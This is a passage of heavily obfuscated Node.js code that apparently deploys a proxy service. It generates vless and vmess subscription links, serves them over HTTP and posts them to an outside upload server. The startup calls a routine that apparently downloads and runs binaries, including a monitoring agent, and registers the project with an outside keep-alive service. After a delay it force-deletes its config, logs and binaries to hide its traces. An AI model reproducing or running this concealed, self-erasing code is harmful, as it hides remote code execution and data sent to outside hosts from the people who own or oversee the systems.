_0x5d6db5['data'][_0x253ac4(0x1c4)]+'_'+_0x5d6db5[_0x253ac4(0x196)][_0x253ac4(0x159)];}catch(_0x416d5f){}}return _0x253ac4(0x1b3);}async function _0x4bad5f(_0x2efa26){const _0x2bbf01=await _0x1b0a8b(),_0x4c3ea8=NAME?NAME+'-'+_0x2bbf01:_0x2bbf01;return new Promise(_0x2a5d90=>{setTimeout(()=>{const _0x2466b6=_0x5f19,_0x1028b9={};_0x1028b9['v']='2',_0x1028b9['ps']=''+_0x4c3ea8,_0x1028b9[_0x2466b6(0x19b)]=CFIP,_0x1028b9[_0x2466b6(0x1f1)]=CFPORT,_0x1028b9['id']=UUID,_0x1028b9['aid']='0',_0x1028b9[_0x2466b6(0x1d2)]='none',_0x1028b9[_0x2466b6(0x146)]='ws',_0x1028b9[_0x2466b6(0x1d7)]=_0x2466b6(0x191),_0x1028b9[_0x2466b6(0x213)]=_0x2efa26,_0x1028b9[_0x2466b6(0x17b)]=_0x2466b6(0x1f2),_0x1028b9['tls']='tls',_0x1028b9[_0x2466b6(0x218)]=_0x2efa26,_0x1028b9[_0x2466b6(0x197)]='',_0x1028b9['fp']='firefox';const _0x2c2322=_0x1028b9,_0x5b9362='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x2466b6(0x1ac)+_0x2efa26+_0x2466b6(0x1b9)+_0x2efa26+_0x2466b6(0x1b6)+_0x4c3ea8+_0x2466b6(0x223)+Buffer[_0x2466b6(0x20e)](JSON[_0x2466b6(0x21c)](_0x2c2322))[_0x2466b6(0x18c)](_0x2466b6(0x180))+_0x2466b6(0x1bc)+UUID+'@'+CFIP+':'+CFPORT+_0x2466b6(0x1b1)+_0x2efa26+'&fp=firefox&type=ws&host='+_0x2efa26+_0x2466b6(0x1e2)+_0x4c3ea8+_0x2466b6(0x151);console[_0x2466b6(0x1e5)](Buffer['from'](_0x5b9362)['toString'](_0x2466b6(0x180))),fs[_0x2466b6(0x18f)](subPath,Buffer[_0x2466b6(0x20e)](_0x5b9362)[_0x2466b6(0x18c)]('base64')),console['log'](FILE_PATH+_0x2466b6(0x1ee)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4eff9e,_0x298c43)=>{const _0x5b5350=_0x2466b6,_0x3f214d=Buffer[_0x5b5350(0x20e)](_0x5b9362)[_0x5b5350(0x18c)](_0x5b5350(0x180));_0x298c43[_0x5b5350(0x1bb)]('Content-Type',_0x5b5350(0x13e)),_0x298c43[_0x5b5350(0x14f)](_0x3f214d);}),_0x2a5d90(_0x5b9362);},0x7d0);});}}async function uploadNodes(){const _0x566fe3=_0x2793bb;if(UPLOAD_URL&&PROJECT_URL){const _0x59ed60=PROJECT_URL+'/'+SUB_PATH,_0x4055ac={};_0x4055ac[_0x566fe3(0x1cb)]=[_0x59ed60];const _0x363c11=_0x4055ac;try{const _0x2778eb={};_0x2778eb['Content-Type']=_0x566fe3(0x1d6);const _0x44d608={};_0x44d608[_0x566fe3(0x17e)]=_0x2778eb;const _0x38eb3f=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x363c11,_0x44d608);return _0x38eb3f&&_0x38eb3f['status']===0xc8?(console[_0x566fe3(0x1e5)](_0x566fe3(0x1d3)),_0x38eb3f):null;}catch(_0x416b9a){if(_0x416b9a[_0x566fe3(0x149)]){if(_0x416b9a[_0x566fe3(0x149)][_0x566fe3(0x140)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x566fe3(0x1eb)](listPath))return;const _0x3484d9=fs[_0x566fe3(0x216)](listPath,_0x566fe3(0x1d9)),_0x380cff=_0x3484d9[_0x566fe3(0x201)]('\x0a')[_0x566fe3(0x203)](_0x2ab845=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x566fe3(0x202)](_0x2ab845));if(_0x380cff['length']===0x0)return;const _0xcac6c9={};_0xcac6c9[_0x566fe3(0x14a)]=_0x380cff;const _0x2f48b6=JSON[_0x566fe3(0x21c)](_0xcac6c9);try{const _0x50520e={};_0x50520e[_0x566fe3(0x184)]='application/json';const _0x1fdbf8={};_0x1fdbf8[_0x566fe3(0x17e)]=_0x50520e;const _0xa2f9b1=await axios[_0x566fe3(0x15e)](UPLOAD_URL+_0x566fe3(0x1ff),_0x2f48b6,_0x1fdbf8);return _0xa2f9b1&&_0xa2f9b1[_0x566fe3(0x140)]===0xc8?(console[_0x566fe3(0x1e5)](_0x566fe3(0x15a)),_0xa2f9b1):null;}catch(_0x4d9721){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x587307=_0x5f19,_0x4805d1=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4805d1[_0x587307(0x1e0)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4805d1[_0x587307(0x1e0)](phpPath);process[_0x587307(0x209)]===_0x587307(0x156)?exec('del\x20/f\x20/q\x20'+_0x4805d1[_0x587307(0x217)]('\x20')+_0x587307(0x147),_0x165d14=>{const _0xa5dac2=_0x587307;console[_0xa5dac2(0x1fd)](),console[_0xa5dac2(0x1e5)](_0xa5dac2(0x144)),console[_0xa5dac2(0x1e5)](_0xa5dac2(0x222));}):exec(_0x587307(0x1af)+_0x4805d1[_0x587307(0x217)]('\x20')+_0x587307(0x1ec),_0x14f887=>{const _0x4e465d=_0x587307;console[_0x4e465d(0x1fd)](),console[_0x4e465d(0x1e5)](_0x4e465d(0x144)),console[_0x4e465d(0x1e5)](_0x4e465d(0x222));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3765cc=_0x2793bb;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3765cc(0x1e5)](_0x3765cc(0x1bd));return;}try{const _0x265912={};_0x265912[_0x3765cc(0x1d0)]=PROJECT_URL;const _0x51ef20={};_0x51ef20['Content-Type']=_0x3765cc(0x1d6);const _0x54d7a6={};_0x54d7a6[_0x3765cc(0x17e)]=_0x51ef20;const _0x25cb8a=await axios[_0x3765cc(0x15e)](_0x3765cc(0x171),_0x265912,_0x54d7a6);return console[_0x3765cc(0x1e5)](_0x3765cc(0x15f)),_0x25cb8a;}catch(_0x55e38b){return console[_0x3765cc(0x1cd)](_0x3765cc(0x1b8)+_0x55e38b[_0x3765cc(0x1aa)]),null;}}async function startserver(){const _0x22a323=_0x2793bb;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x270044){console[_0x22a323(0x1cd)](_0x22a323(0x1db),_0x270044);}}startserver()['catch'](_0x25c414=>{const _0x264357=_0x2793bb;console[_0x264357(0x1cd)](_0x264357(0x21f),_0x25c414);}),app[_0x2793bb(0x1e8)](PORT,()=>console[_0x2793bb(0x1e5)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
